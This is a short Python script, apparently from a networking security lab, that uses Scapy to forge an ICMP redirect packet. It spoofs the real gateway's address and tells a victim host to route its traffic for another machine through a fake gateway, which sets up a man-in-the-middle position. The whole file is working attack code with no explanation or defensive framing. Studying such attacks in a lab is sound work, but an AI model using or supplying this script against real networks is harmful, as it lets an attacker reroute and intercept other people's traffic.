#!/usr/bin/env python3
from scapy.all import *

victim = "10.9.0.5"
target_machine = "192.168.60.5"
real_gateway = "10.9.0.11"
fake_gateway = "10.9.0.12"

ip = IP(src=real_gateway, dst=victim)
icmp = ICMP(type=5, code=1)
icmp.gw = fake_gateway

ip2 = IP(src=victim, dst=target_machine)
send(ip/icmp/ip2/ICMP());
